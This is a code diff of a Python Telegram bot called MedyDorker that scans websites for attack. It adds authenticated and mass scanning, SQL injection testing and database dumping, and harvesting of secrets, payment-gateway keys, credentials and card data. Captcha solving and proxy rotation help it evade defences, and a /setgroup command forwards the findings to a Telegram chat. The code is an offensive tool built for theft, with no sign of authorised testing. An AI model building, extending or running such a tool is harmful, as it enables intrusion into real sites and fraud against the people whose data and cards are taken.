+            text += f"  Env vars leaked: {len(js_analysis_result.env_vars)}\n"
+        text += "\n"
+    
+    if api_brute_result and api_brute_result.endpoints_found:
+        text += f"<b>🔨 API Discovery:</b>\n"
+        text += f"  Probed: {api_brute_result.endpoints_probed}\n"
+        text += f"  Open: {len(api_brute_result.open_endpoints)}\n"
+        text += f"  Auth-required: {len(api_brute_result.auth_endpoints)}\n"
+        if api_brute_result.graphql_introspection:
+            text += "  📊 GraphQL introspection OPEN\n"
+        text += "\n"
+    
+    if spa_result and not spa_result.error:
+        spa_items = len(spa_result.forms) + len(spa_result.api_calls) + len(spa_result.param_urls)
+        if spa_items > 0:
+            text += f"<b>🌐 SPA Rendering:</b>\n"
+            if spa_result.forms:
+                text += f"  Forms: {len(spa_result.forms)}\n"
+            if spa_result.api_calls:
+                text += f"  Intercepted API calls: {len(spa_result.api_calls)}\n"
+            if spa_result.param_urls:
+                text += f"  Param URLs: {len(spa_result.param_urls)}\n"
+            if spa_result.internal_links:
+                text += f"  Internal links: {len(spa_result.internal_links)}\n"
+            text += "\n"
     
     # ── Platform ──
     if platform_info:
@@ -1806,7 +3474,15 @@ async def _do_scan(update: Update, url: str):
         if waf_result.get("cms"):
             parts.append(f"CMS: {waf_result['cms']}")
         text += "  " + " | ".join(parts) if parts else "  None"
-        text += "\n\n"
+        text += "\n"
+        # WAF + CMS hints
+        waf_hint = get_waf_hint(
+            waf_name=waf_result.get("name", ""),
+            cms_name=waf_result.get("cms", "")
+        )
+        if waf_hint:
+            text += f"  💡 {waf_hint}\n"
+        text += "\n"
     
     # ── Secrets ──
     if all_secrets:
@@ -1818,12 +3494,19 @@ async def _do_scan(update: Update, url: str):
             for s in gateway_secrets:
                 text += f"  <b>{s.key_name}</b>\n"
                 text += f"  <code>{s.value[:80]}</code>\n"
-                text += f"  📍 {s.url}\n\n"
+                text += f"  📍 {s.url}\n"
+                hint = get_secret_hint(s.type, s.value, s.key_name)
+                if hint:
+                    text += f"  {hint}\n"
+                text += "\n"
         
         if other_secrets:
             text += f"<b>🔐 Other Secrets ({len(other_secrets)}):</b>\n"
             for s in other_secrets[:15]:
                 text += f"  <b>{s.key_name}</b>: <code>{s.value[:50]}</code>\n"
+                hint = get_secret_hint(s.type, s.value, s.key_name)
+                if hint:
+                    text += f"  {hint}\n"
             if len(other_secrets) > 15:
                 text += f"  ... +{len(other_secrets) - 15} more\n"
             text += "\n"
@@ -1841,15 +3524,24 @@ async def _do_scan(update: Update, url: str):
             "file_upload": "📤 Upload", "admin_pages": "👤 Admin",
             "api_calls": "🌍 ExtAPI", "interesting_js": "📜 JS",
         }
+        ep_hints_batch = []
         for key, label in ep_labels.items():
             eps = all_endpoints.get(key, [])
             if eps:
                 text += f"  {label}: {len(eps)}\n"
+                eh = get_endpoint_hint(key)
+                if eh:
+                    ep_hints_batch.append(eh)
+        if ep_hints_batch:
+            text += "\n  <b>💡 Endpoint Intelligence:</b>\n"
+            for eh in ep_hints_batch:
+                text += f"  {eh}\n\n"
         text += "\n"
     
     # ── SQLi ──
     if all_sqli_results:
         text += f"<b>🔓 SQL Injection ({len(all_sqli_results)}):</b>\n"
+        sqli_hints_shown = set()
         for r in all_sqli_results:
             text += f"  ⚠️ <b>{r['technique']}</b> ({r['injection_type']}) via {r.get('injection_point', 'url')}\n"
             text += f"     Param: <code>{r['param']}</code> | DBMS: {r['dbms']}\n"
@@ -1858,6 +3550,17 @@ async def _do_scan(update: Update, url: str):
             if r.get('current_db'):
                 text += f"     DB: {r['current_db']}\n"
             text += f"     <code>{r['url'][:70]}</code>\n\n"
+        # Aggregate SQLi hints by technique type (avoid duplicates)
+        text += "  <b>💡 SQLi Intelligence:</b>\n"
+        for r in all_sqli_results:
+            tech = r.get('technique', '').lower()
+            point = r.get('injection_point', 'url').lower()
+            hint_key = f"{tech}_{point}"
+            if hint_key not in sqli_hints_shown:
+                sqli_hints_shown.add(hint_key)
+                sh = get_sqli_hint(tech, point)
+                if sh:
+                    text += f"  {sh}\n\n"
     elif sqli_tested > 0:
         text += f"🔓 Tested {sqli_tested} endpoints — none injectable\n\n"
     else:
@@ -1875,7 +3578,42 @@ async def _do_scan(update: Update, url: str):
                 text += f"  🔐 Credentials: {d['credentials']}\n"
             if d.get('gateway_keys', 0) > 0:
                 text += f"  🔑 Gateway Keys: {d['gateway_keys']}\n"
+            # Dump hint
+            dump_h = get_dump_hint(
+                tables_found=d.get('tables', 0),
+                has_users=d.get('credentials', 0) > 0,
+                has_cards=d.get('cards', 0) > 0,
+                dbms=d.get('dbms', '')
+            )
+            text += f"  💡 {dump_h}\n"
             text += "\n"
+    
+    # ── Ports (v3.10) ──
+    if all_port_results:
+        text += f"<b>🔌 Open Ports ({len(all_port_results)}):</b>\n"
+        for pr in all_port_results:
+            risk_icon = "🔴" if pr['risk'] == 'high' else ("🟡" if pr['risk'] == 'medium' else "🟢")
+            text += f"  {risk_icon} <b>{pr['port']}</b> ({pr['service']}"
+            if pr.get('version'):
+                text += f" {pr['version']}"
+            text += ")\n"
+            ph = get_port_hint(pr['port'])
+            if ph:
+                text += f"     💡 {ph}\n"
+        text += "\n"
+    
+    # ── Contextual Intelligence (combined findings) ──
+    ctx_hints = get_contextual_hints(
+        url=url,
+        cookies=all_cookies if all_cookies else None,
+        secrets=all_secrets if all_secrets else None,
+        waf=waf_result,
+        endpoints=all_endpoints if all_endpoints else None,
+    )
+    if ctx_hints:
+        text += "<b>🧠 Combined Intelligence:</b>\n"
+        for ch in ctx_hints:
+            text += f"{ch}\n\n"
     
     text += "━━━━━━━━━━━━━━━━━━━━"
     
@@ -1891,6 +3629,766 @@ async def _do_scan(update: Update, url: str):
 async def cmd_deepscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /deepscan — alias for /scan (full domain scan)."""
     await cmd_scan(update, context)
+
+
+async def cmd_authscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /authscan command — authenticated scan with session cookies.
+    
+    Usage:
+        /authscan <url> cookie1=value1 cookie2=value2
+        /authscan <url> "Cookie: session=abc123; token=xyz"
+        /authscan <url> session=abc123
+    
+    Scans behind login walls by injecting your session cookies.
+    Uses Playwright (JS rendering) + cookie injection to access
+    authenticated dashboards, admin panels, API endpoints.
+    """
+    if not context.args or len(context.args) < 2:
+        await update.message.reply_text(
+            "<b>🔐 Authenticated Scan</b>\n\n"
+            "Usage:\n"
+            "<code>/authscan https://site.com session=abc123 token=xyz</code>\n"
+            "<code>/authscan https://site.com \"Cookie: name=val; name2=val\"</code>\n\n"
+            "Scans behind login walls using your session cookies.\n"
+            "Uses Playwright + FlareSolverr for full JS rendering.\n\n"
+            "Steps:\n"
+            "1. Log into the target site in your browser\n"
+            "2. Copy your session cookies from DevTools\n"
+            "3. Run /authscan with the URL and cookies\n\n"
+            "The scanner will:\n"
+            "• Render the page with your cookies (sees dashboard)\n"
+            "• Intercept all API calls the page makes\n"
+            "• Discover forms/params in the rendered DOM\n"
+            "• Analyze JS bundles for hidden endpoints\n"
+            "• Bruteforce API paths with your session\n"
+            "• Test discovered endpoints for SQLi",
+            parse_mode="HTML"
+        )
+        return
+    
+    chat_id = update.effective_chat.id
+    existing = scan_tasks.get(chat_id)
+    if existing and not existing.done():
+        await update.message.reply_text("⚠️ A scan is already running. Use /stopscan to cancel it first.")
+        return
+    
+    url = context.args[0]
+    if not url.startswith("http"):
+        url = "https://" + url
+    
+    # Parse cookies from remaining args
+    cookie_args = " ".join(context.args[1:])
+    cookies = {}
+    
+    # Try "Cookie: name=val; name2=val" format
+    if cookie_args.startswith('"') or cookie_args.startswith("Cookie:"):
+        cookie_str = cookie_args.strip('"').strip("'")
+        if cookie_str.startswith("Cookie:"):
+            cookie_str = cookie_str[7:].strip()
+        for pair in cookie_str.split(";"):
+            pair = pair.strip()
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                cookies[k.strip()] = v.strip()
+    else:
+        # Try name=value name2=value2 format
+        for arg in context.args[1:]:
+            if "=" in arg:
+                k, v = arg.split("=", 1)
+                cookies[k.strip()] = v.strip()
+    
+    if not cookies:
+        await update.message.reply_text(
+            "❌ No cookies parsed. Use format:\n"
+            "<code>/authscan URL session=value token=value</code>",
+            parse_mode="HTML"
+        )
+        return
+    
+    cookie_names = ", ".join(cookies.keys())
+    await update.message.reply_text(
+        f"🔐 <b>Authenticated Scan Starting</b>\n"
+        f"🌐 Target: <code>{url}</code>\n"
+        f"🍪 Cookies: {cookie_names}\n\n"
+        f"Phase 1: Playwright SPA Rendering (with cookies)\n"
+        f"Phase 2: JS Bundle Analysis\n"
+        f"Phase 3: API Endpoint Discovery (authenticated)\n"
+        f"Phase 4: Full scan pipeline on discoveries\n\n"
+        f"Use /stopscan to cancel.",
+        parse_mode="HTML"
+    )
+    
+    async def _run_authscan():
+        try:
+            await _do_authscan(update, url, cookies)
+        except asyncio.CancelledError:
+            await update.message.reply_text("🛑 Authenticated scan cancelled.")
+        except Exception as e:
+            logger.error(f"Authscan error: {e}")
+            await update.message.reply_text(f"❌ Authscan error: {str(e)[:200]}")
+        finally:
+            scan_tasks.pop(chat_id, None)
+    
+    task = asyncio.create_task(_run_authscan())
+    scan_tasks[chat_id] = task
+
+
+async def _do_authscan(update: Update, url: str, cookies: Dict[str, str]):
+    """Authenticated domain scanner — uses injected cookies to scan behind login walls."""
+    p = get_pipeline()
+    
+    from urllib.parse import urlparse as _urlparse
+    
+    parsed = _urlparse(url)
+    base_domain = parsed.netloc
+    base_url = f"{parsed.scheme}://{base_domain}"
+    
+    all_discovered_endpoints = set()
+    all_param_urls = set()
+    all_secrets = []
+    all_api_calls = []
+    detected_framework = ""
+    
+    # ═══ Phase 1: Playwright SPA Rendering with cookies ═══
+    await update.message.reply_text("⏳ Phase 1: Rendering authenticated page with Playwright...", parse_mode="HTML")
+    
+    spa_result = None
+    try:
+        if _HAS_PLAYWRIGHT:
+            spa_result = await spa_extract(
+                url, cookies=cookies, wait_seconds=5.0,
+                scroll=True, intercept_api=True,
+            )
+        else:
+            spa_result = await spa_extract_with_flaresolverr(url, cookies=cookies)
+        
+        if spa_result and not spa_result.error:
+            detected_framework = spa_result.framework
+            
+            msg = f"🌐 <b>Authenticated Page Rendered</b>\n"
+            msg += f"  Title: {spa_result.title[:60]}\n" if spa_result.title else ""
+            if spa_result.framework:
+                msg += f"  Framework: <b>{spa_result.framework}</b>\n"
+            msg += f"  Forms: {len(spa_result.forms)}\n"
+            msg += f"  Links: {len(spa_result.internal_links)}\n"
+            msg += f"  Param URLs: {len(spa_result.param_urls)}\n"
+            msg += f"  API calls intercepted: {len(spa_result.api_calls)}\n"
+            msg += f"  Cookies set: {len(spa_result.cookies)}\n"
+            
+            if spa_result.api_calls:
+                msg += "\n  <b>Intercepted API Calls:</b>\n"
+                for ac in spa_result.api_calls[:8]:
+                    msg += f"    {ac.get('method','GET')} <code>{ac.get('url','')[:70]}</code>\n"
+                if len(spa_result.api_calls) > 8:
+                    msg += f"    ... +{len(spa_result.api_calls) - 8} more\n"
+            
+            await update.message.reply_text(msg, parse_mode="HTML")
+            
+            # Collect discoveries
+            for pu in spa_result.param_urls:
+                all_param_urls.add(pu)
+            for il in spa_result.internal_links:
+                all_discovered_endpoints.add(il)
+            all_api_calls.extend(spa_result.api_calls)
+            
+            for ac in spa_result.api_calls:
+                ac_url = ac.get("url", "")
+                if ac_url:
+                    all_discovered_endpoints.add(ac_url)
+                    ac_parsed = _urlparse(ac_url)
+                    if ac_parsed.query:
+                        all_param_urls.add(ac_url)
+        elif spa_result:
+            await update.message.reply_text(f"⚠️ SPA rendering error: {spa_result.error[:200]}", parse_mode="HTML")
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ SPA rendering failed: {str(e)[:200]}", parse_mode="HTML")
+    
+    # ═══ Phase 2: JS Bundle Analysis with cookies ═══
+    await update.message.reply_text("⏳ Phase 2: JS Bundle Analysis (authenticated)...", parse_mode="HTML")
+    
+    js_result = None
+    try:
+        # Use rendered HTML from SPA extraction if available
+        html_content = spa_result.rendered_html if spa_result and spa_result.rendered_html else None
+        
+        js_result = await analyze_js_bundles(
+            url, cookies=cookies, html_content=html_content,
+        )
+        
+        if js_result.api_endpoints or js_result.secrets:
+            detected_framework = detected_framework or js_result.framework
+            
+            msg = f"🔬 <b>JS Bundle Analysis</b> ({js_result.js_files_analyzed} files)\n"
+            if js_result.api_endpoints:
+                msg += f"  API endpoints: {len(js_result.api_endpoints)}\n"
+                for ep in js_result.api_endpoints[:5]:
+                    msg += f"    {ep.method} <code>{ep.url[:70]}</code>\n"
+            if js_result.secrets:
+                msg += f"  Secrets: {len(js_result.secrets)}\n"
+                for s in js_result.secrets[:3]:
+                    msg += f"    [{s.secret_type}] {s.value[:40]}...\n"
+            if js_result.page_routes:
+                msg += f"  Routes: {len(js_result.page_routes)}\n"
+            
+            await update.message.reply_text(msg, parse_mode="HTML")
+            
+            for ep in js_result.api_endpoints:
+                all_discovered_endpoints.add(ep.url)
+                ep_p = _urlparse(ep.url)
+                if ep_p.query:
+                    all_param_urls.add(ep.url)
+            
+            for s in js_result.secrets:
+                all_secrets.append(type('Secret', (), {
+                    'url': url, 'type': s.secret_type, 'value': s.value,
+                    'category': 'js_bundle', 'confidence': s.confidence,
+                    'source': s.source_file,
+                })())
+            
+            for route in js_result.page_routes:
+                if route.startswith("/"):
+                    all_discovered_endpoints.add(base_url + route)
+    except Exception as e:
+        logger.error(f"JS analysis error in authscan: {e}")
+    
+    # ═══ Phase 3: API Bruteforce with cookies ═══
+    await update.message.reply_text("⏳ Phase 3: API Endpoint Discovery (authenticated)...", parse_mode="HTML")
+    
+    api_result = None
+    try:
+        custom_paths = []
+        if js_result and js_result.page_routes:
+            for route in js_result.page_routes:
+                if route.startswith("/"):
+                    custom_paths.append(route)
+                    if not route.startswith("/api/"):
+                        custom_paths.append(f"/api{route}")
+        
+        api_result = await bruteforce_api(
+            url=url,
+            framework=detected_framework,
+            cookies=cookies,
+            custom_paths=custom_paths if custom_paths else None,
+        )
+        
+        if api_result.endpoints_found:
+            msg = f"🔨 <b>API Discovery</b> ({api_result.endpoints_probed} probed)\n"
+            msg += f"  Open: {len(api_result.open_endpoints)}\n"
+            msg += f"  Auth-required: {len(api_result.auth_endpoints)}\n"
+            
+            for ep in api_result.open_endpoints[:5]:
+                msg += f"  ✅ {ep.method} <code>{ep.url[:70]}</code> [{ep.status}]\n"
+                if ep.reason:
+                    msg += f"      → {ep.reason[:80]}\n"
+            
+            if api_result.graphql_introspection:
+                msg += "  📊 <b>GraphQL introspection OPEN!</b>\n"
+            
+            await update.message.reply_text(msg, parse_mode="HTML")
+            
+            for ep in api_result.endpoints_found:
+                all_discovered_endpoints.add(ep.url)
+                ep_p = _urlparse(ep.url)
+                if ep_p.query:
+                    all_param_urls.add(ep.url)
+    except Exception as e:
+        logger.error(f"API bruteforce error in authscan: {e}")
+    
+    # ═══ Phase 4: Run full _do_scan on URL if we found stuff ═══
+    total_found = len(all_discovered_endpoints) + len(all_param_urls)
+    
+    await update.message.reply_text(
+        f"📊 <b>Auth Scan Discovery Summary</b>\n"
+        f"  Total endpoints: {len(all_discovered_endpoints)}\n"
+        f"  Param URLs: {len(all_param_urls)}\n"
+        f"  API calls intercepted: {len(all_api_calls)}\n"
+        f"  Secrets found: {len(all_secrets)}\n"
+        f"  Framework: {detected_framework or 'unknown'}\n\n"
+        f"Now running full scan pipeline on discoveries...",
+        parse_mode="HTML"
+    )
+    
+    # Run the standard _do_scan which includes the SPA intelligence phase
+    await _do_scan(update, url)
+
+
+async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /mass command — scan up to 25 URLs in sequence.
+    
+    Usage:
+        /mass url1 url2 url3 ...
+        /mass url1
+              url2
+              url3
+    """
+    if not context.args:
+        await update.message.reply_text(
+            "<b>Usage:</b> /mass url1 url2 url3 ...\n\n"
+            "Scans up to 25 URLs in sequence through the full pipeline "
+            "(WAF + Secrets + Crawl + FlareSolverr + SQLi + Dump).\n\n"
+            "<i>Paste URLs separated by spaces or newlines.</i>",
+            parse_mode="HTML"
+        )
+        return
+
+    chat_id = update.effective_chat.id
+
+    # Check if a scan is already running
+    existing = scan_tasks.get(chat_id)
+    if existing and not existing.done():
+        await update.message.reply_text("⚠️ A scan is already running. Use /stopscan to cancel it first.")
+        return
+
+    # Normalize URLs
+    raw_urls = context.args[:]
+    urls = []
+    for u in raw_urls:
+        u = u.strip().rstrip(",").strip()
+        if not u:
+            continue
+        if not u.startswith("http"):
+            u = "https://" + u
+        urls.append(u)
+
+    if not urls:
+        await update.message.reply_text("❌ No valid URLs provided.")
+        return
+
+    if len(urls) > 25:
+        await update.message.reply_text(
+            f"⚠️ Too many URLs ({len(urls)}). Max is <b>25</b>. Trimming to first 25.",
+            parse_mode="HTML"
+        )
+        urls = urls[:25]
+
+    # Deduplicate while preserving order
+    seen = set()
+    deduped = []
+    for u in urls:
+        if u not in seen:
+            seen.add(u)
+            deduped.append(u)
+    urls = deduped
+
+    url_list_text = "\n".join(f"  {i+1}. <code>{u[:80]}</code>" for i, u in enumerate(urls))
+    await update.message.reply_text(
+        f"🚀 <b>Mass Scan Starting — {len(urls)} URLs</b>\n\n"
+        f"{url_list_text}\n\n"
+        f"Each URL goes through the full pipeline:\n"
+        f"WAF → Secrets → Deep Crawl (+ FlareSolverr) → SQLi → Dump\n\n"
+        f"Use /stopscan to cancel.",
+        parse_mode="HTML"
+    )
+
+    async def _run_mass():
+        completed = 0
+        failed = 0
+        findings_summary = []  # (url, summary_str)
+        try:
+            for idx, url in enumerate(urls, 1):
+                # Check if cancelled
+                if asyncio.current_task().cancelled():
+                    raise asyncio.CancelledError()
+
+                await update.message.reply_text(
+                    f"\n{'━'*30}\n"
+                    f"🔍 <b>[{idx}/{len(urls)}] Scanning:</b>\n"
+                    f"<code>{url}</code>",
+                    parse_mode="HTML"
+                )
+
+                try:
+                    await _do_scan(update, url)
+                    completed += 1
+                    findings_summary.append((url, "✅"))
+                except asyncio.CancelledError:
+                    raise
+                except Exception as e:
+                    failed += 1
+                    findings_summary.append((url, f"❌ {str(e)[:80]}"))
+                    logger.error(f"[Mass] Scan failed for {url}: {e}")
+                    await update.message.reply_text(
+                        f"❌ Scan failed for <code>{url[:80]}</code>: {str(e)[:200]}",
+                        parse_mode="HTML"
+                    )
+
+            # Final summary
+            summary_lines = []
+            for u, status in findings_summary:
+                domain = urlparse(u).netloc or u[:40]
+                summary_lines.append(f"  {status} {domain}")
+
+            await update.message.reply_text(
+                f"\n{'━'*30}\n"
+                f"📊 <b>Mass Scan Complete</b>\n\n"
+                f"Total: <b>{len(urls)}</b> | "
+                f"Done: <b>{completed}</b> | "
+                f"Failed: <b>{failed}</b>\n\n"
+                + "\n".join(summary_lines),
+                parse_mode="HTML"
+            )
+        except asyncio.CancelledError:
+            await update.message.reply_text(
+                f"🛑 Mass scan cancelled after {completed}/{len(urls)} URLs."
+            )
+        except Exception as e:
+            logger.error(f"Mass scan error: {e}")
+            await update.message.reply_text(f"❌ Mass scan error: {str(e)[:200]}")
+        finally:
+            scan_tasks.pop(chat_id, None)
+
+    task = asyncio.create_task(_run_mass())
+    scan_tasks[chat_id] = task
+
+
+async def cmd_setgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /setgroup — set this chat as the report group for all findings."""
+    p = get_pipeline()
+    chat_id = update.effective_chat.id
+    chat = update.effective_chat
+
+    if context.args and context.args[0].lower() == "off":
+        p.set_report_group(None)
+        p._report_chat_id = None
+        await update.message.reply_text("📤 Report group disabled. Findings will only go to the dorking chat.")
+        return
+
+    p.set_report_group(chat_id)
+    chat_title = chat.title or chat.first_name or str(chat_id)
+    await update.message.reply_text(
+        f"📤 <b>Report group set!</b>\n\n"
+        f"Chat: <b>{chat_title}</b> ({chat_id})\n\n"
+        f"All findings (SQLi, secrets, gateways, cards, API keys) "
+        f"will be automatically forwarded here.\n\n"
+        f"Hourly export summaries will also be posted.\n"
+        f"Use <code>/setgroup off</code> to disable.",
+        parse_mode="HTML"
+    )
+
+
+async def cmd_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /export — immediately generate and send an export .txt file."""
+    p = get_pipeline()
+
+    await update.message.reply_text("📁 Generating export...")
+
+    filepath = await p._write_export()
+    if not filepath:
+        await update.message.reply_text("❌ Export failed — check logs.")
+        return
+
+    stats = p.get_stats()
+
+    # Send as document
+    try:
+        with open(filepath, 'rb') as f:
+            await update.message.reply_document(
+                document=f,
+                filename=os.path.basename(filepath),
+                caption=(
+                    f"📁 MedyDorker Export\n"
+                    f"URLs: {stats['urls_scanned']} | "
+                    f"SQLi: {stats['sqli_vulns']} | "
+                    f"Secrets: {stats['secrets_found']} | "
+                    f"Gateways: {stats['gateways_found']} | "
+                    f"Cards: {stats['cards_found']}"
+                ),
+            )
+    except Exception as e:
+        await update.message.reply_text(
+            f"📁 Export saved to:\n<code>{filepath}</code>\n\n"
+            f"(Could not send as document: {str(e)[:100]})",
+            parse_mode="HTML"
+        )
+
+
+async def cmd_firecrawl(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show Firecrawl status and usage."""
+    p = get_pipeline()
+    
+    if not p.config.firecrawl_enabled or not p.config.firecrawl_api_key:
+        await update.message.reply_text("❌ Firecrawl is not configured. Set FIRECRAWL_API_KEY env var.")
+        return
+    
+    fc_status = "✅ Enabled"
+    mode = "Fallback only" if p.config.firecrawl_as_fallback else "Primary engine"
+    scrape = "✅" if p.config.firecrawl_scrape_enabled else "❌"
+    crawl = "✅" if p.config.firecrawl_crawl_enabled else "❌"
+    
+    # Get engine stats
+    fc_stats = p.searcher.health.get_stats().get("firecrawl", {})
+    
+    text = (
+        f"🔥 <b>Firecrawl Status</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"Status: {fc_status}\n"
+        f"Mode: {mode}\n"
+        f"Search: ✅ | Scrape: {scrape} | Crawl: {crawl}\n"
+        f"Search Limit: {p.config.firecrawl_search_limit} results/query\n"
+        f"Crawl Limit: {p.config.firecrawl_crawl_limit} pages\n"
+        f"Proxy Mode: {p.config.firecrawl_proxy_mode}\n\n"
+        f"<b>Engine Stats:</b>\n"
+        f"Searches: {fc_stats.get('success', 0)} ok / {fc_stats.get('fail', 0)} fail\n"
+        f"Rate: {fc_stats.get('rate', 'N/A')}\n"
+        f"Available: {'✅' if fc_stats.get('available', True) else '❌ cooled down'}"
+    )
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show captcha solver status, balances, and stats."""
+    p = get_pipeline()
+
+    if not p.captcha_solver or not p.captcha_solver.available:
+        await update.message.reply_text(
+            "🧩 <b>Captcha Solver</b>\n\n"
+            "❌ Not configured. Set API keys in config:\n"
+            "<code>TWOCAPTCHA_API_KEY</code>\n"
+            "<code>NOPECHA_API_KEY</code>\n"
+            "<code>ANTICAPTCHA_API_KEY</code>",
+            parse_mode="HTML",
+        )
+        return
+
+    stats = p.captcha_solver.get_stats()
+
+    # Get balances (async)
+    balances = await p.captcha_solver.get_balances()
+    bal_lines = []
+    for prov, bal in balances.items():
+        if bal < 0:
+            bal_lines.append(f"  {prov}: ⚠️ error")
+        else:
+            bal_lines.append(f"  {prov}: ${bal:.4f}")
+    bal_text = "\n".join(bal_lines) if bal_lines else "  No providers"
+
+    # Per-type breakdown
+    type_lines = []
+    for ctype, s in stats.get("by_type", {}).items():
+        total = s["solved"] + s["failed"]
+        rate = f"{s['solved']/total:.0%}" if total else "N/A"
+        type_lines.append(f"  {ctype}: {s['solved']}✅ {s['failed']}❌ ({rate})")
+    type_text = "\n".join(type_lines) if type_lines else "  No solves yet"
+
+    # Per-provider breakdown
+    prov_lines = []
+    for prov, s in stats.get("by_provider", {}).items():
+        total = s["solved"] + s["failed"]
+        rate = f"{s['solved']/total:.0%}" if total else "N/A"
+        prov_lines.append(f"  {prov}: {s['solved']}✅ {s['failed']}❌ ({rate})")
+    prov_text = "\n".join(prov_lines) if prov_lines else "  No solves yet"
+
+    text = (
+        f"🧩 <b>Captcha Solver Status</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"Status: ✅ Enabled\n"
+        f"Providers: {', '.join(stats['providers'])}\n"
+        f"Auto-solve search: {'✅' if stats['auto_solve_search'] else '❌'}\n"
+        f"Auto-solve target: {'✅' if stats['auto_solve_target'] else '❌'}\n\n"
+        f"<b>Balances:</b>\n{bal_text}\n\n"
+        f"<b>Stats:</b>\n"
+        f"  Attempts: {stats['total_attempts']}\n"
+        f"  Solved: {stats['total_solved']}\n"
+        f"  Failed: {stats['total_failed']}\n"
+        f"  Rate: {stats['success_rate']}\n"
+        f"  Cost: {stats['total_cost']}\n"
+        f"  Avg time: {stats['avg_solve_time']}\n\n"
+        f"<b>By Type:</b>\n{type_text}\n\n"
+        f"<b>By Provider:</b>\n{prov_text}"
+    )
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /proxy command — show proxy pool status and stats."""
+    p = get_pipeline()
+    
+    if not p.proxy_manager or not p.proxy_manager.has_proxies:
+        await update.message.reply_text(
+            "🔄 <b>Proxy Manager</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n"
+            "Status: ❌ Disabled (no proxies loaded)\n\n"
+            "Configure proxy_files in config_v3.py and set use_proxies=True",
+            parse_mode="HTML"
+        )
+        return
+    
+    stats = p.proxy_manager.get_stats()
+    
+    # Country breakdown (top 5)
+    country_lines = []
+    countries = p.proxy_manager.get_country_breakdown()
+    for country, count in list(countries.items())[:5]:
+        country_lines.append(f"  {country}: {count}")
+    country_text = "\n".join(country_lines) if country_lines else "  Unknown"
+    
+    # Source breakdown
+    source_lines = []
+    for src, count in stats.by_source.items():
+        source_lines.append(f"  {src}: {count}")
+    source_text = "\n".join(source_lines) if source_lines else "  N/A"
+    
+    # Top proxies
+    top_lines = []
+    for addr, score in stats.top_proxies:
+        top_lines.append(f"  {addr} (score: {score:.2f})")
+    top_text = "\n".join(top_lines) if top_lines else "  No data yet"
+    
+    # Worst proxies
+    worst_lines = []
+    for addr, fails in stats.worst_proxies:
+        worst_lines.append(f"  {addr} ({fails} fails)")
+    worst_text = "\n".join(worst_lines) if worst_lines else "  None"
+    
+    # Success rate
+    total_reqs = stats.total_successes + stats.total_failures
+    success_pct = f"{stats.total_successes / total_reqs:.0%}" if total_reqs else "N/A"
+    
+    text = (
+        f"🔄 <b>Proxy Pool Status</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"Status: ✅ Enabled\n"
+        f"Strategy: {p.proxy_manager.pool.strategy.value}\n"
+        f"Total: {stats.total_proxies}\n"
+        f"Alive: {stats.alive_proxies}\n"
+        f"Banned: {stats.banned_proxies}\n"
+        f"Dead: {stats.dead_proxies}\n\n"
+        f"<b>Requests:</b>\n"
+        f"  Total: {total_reqs}\n"
+        f"  Success: {stats.total_successes}\n"
+        f"  Failed: {stats.total_failures}\n"
+        f"  Rate: {success_pct}\n"
+        f"  Avg latency: {stats.avg_latency_ms:.0f}ms\n\n"
+        f"<b>Countries:</b>\n{country_text}\n\n"
+        f"<b>Sources:</b>\n{source_text}\n\n"
+        f"<b>Top Proxies:</b>\n{top_text}\n\n"
+        f"<b>Worst Proxies:</b>\n{worst_text}"
+    )
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_browser(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /browser command — show headless browser engine stats."""
+    p = get_pipeline()
+    
+    if not p.browser_manager:
+        pw_status = "✅ Installed" if _HAS_PLAYWRIGHT else "❌ Not installed"
+        await update.message.reply_text(
+            f"🌐 <b>Headless Browser Engine</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"Status: ❌ Disabled\n"
+            f"Playwright: {pw_status}\n\n"
+            f"Set browser_enabled=True in config.\n"
+            f"Install: <code>pip install playwright && playwright install chromium</code>",
+            parse_mode="HTML"
+        )
+        return
+    
+    stats = p.browser_manager.get_stats()
+    
+    text = (
+        f"🌐 <b>Headless Browser Engine</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"Status: {'✅ Running' if stats['running'] else '⏳ Idle (starts on demand)'}\n"
+        f"Playwright: {'✅ Available' if stats['available'] else '❌ Missing'}\n"
+        f"Headless: {p.config.browser_headless}\n"
+        f"Max concurrent tabs: {p.config.browser_max_concurrent}\n"
+        f"Fallback engines: {', '.join(p.config.browser_engines)}\n\n"
+        f"<b>Stats:</b>\n"
+        f"  Searches: {stats['searches']}\n"
+        f"  Total results: {stats['total_results']}\n"
+        f"  Avg results/search: {stats['avg_results']:.1f}\n"
+        f"  Errors: {stats['errors']}\n"
+        f"  Captchas hit: {stats['captchas_hit']}\n"
+    )
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_ecom(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /ecom command — show e-commerce checker stats."""
+    p = get_pipeline()
+    if not p.ecom_checker:
+        await update.message.reply_text("❌ E-commerce checker is not enabled. Set ecom_checker_enabled=True in config.")
+        return
+    text = p.ecom_checker.get_stats_text()
+    await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_crawlstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /crawlstats command — show recursive crawler stats."""
+    p = get_pipeline()
+    if not p.crawler:
+        await update.message.reply_text(
+            "❌ Recursive crawler is not enabled.\n"
+            "Set <code>deep_crawl_enabled=True</code> in config.",
+            parse_mode="HTML",
+        )
+        return
